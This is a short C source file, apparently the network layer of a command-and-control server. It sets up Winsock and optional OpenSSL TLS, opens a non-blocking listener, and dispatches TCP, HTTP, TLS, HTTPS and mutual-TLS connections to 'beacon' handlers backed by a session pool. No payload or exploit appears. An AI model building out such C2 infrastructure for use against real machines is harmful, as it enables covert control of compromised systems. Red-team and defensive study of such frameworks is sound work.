#include "../include/Network.h"
#include <stdio.h>
#include <string.h>

#ifdef _WIN32
    #include <winsock2.h>
#endif

int NetInit(void)
{
#ifdef _WIN32
    WSADATA W;
    return WSAStartup(MAKEWORD(2, 2), &W) == 0;
#endif
    return 1;
}

void NetShutdown(void)
{
#ifdef _WIN32
    WSACleanup();
#endif
}

int NetStart(const Config *C, NetHandle *H)
{
    memset(H, 0, sizeof(*H));

#ifdef HAVE_OPENSSL
    if (C->Mode >= ModeTls) {
        H->Ctx = TlsCreateCtx(C);
        if (!H->Ctx) { fprintf(stderr, "[!] TLS context init failed.\n"); return 0; }
    }
#endif

    H->Listener = TcpListen(C);
    if (H->Listener == NetInvalid) {
        fprintf(stderr, "[!] Failed to bind %s:%d\n", C->BindAddr, C->Port);
        return 0;
    }
    TcpNonBlock(H->Listener);
    return 1;
}

void NetStop(NetHandle *H)
{
    if (H->Listener != NetInvalid) NetClose(H->Listener);
#ifdef HAVE_OPENSSL
    if (H->Ctx) SSL_CTX_free(H->Ctx);
#endif
}

void NetDispatch(NetHandle *H, SessionPool *P, const Config *C)
{
    switch (C->Mode) {
        case ModeTcp:
            TcpHandleBeacon(H->Listener, P);
            break;
        case ModeHttp:
            HttpHandleBeacon(H->Listener, P, C);
            break;
#ifdef HAVE_OPENSSL
        case ModeTls:
            TlsHandleBeacon(H->Listener, P, C, H->Ctx);
            break;
        case ModeHttps:
            HttpsHandleBeacon(H->Listener, P, C, H->Ctx);
            break;
        case ModeMtls:
            TlsHandleBeacon(H->Listener, P, C, H->Ctx);
            break;
#endif
        default:
            break;
    }
}
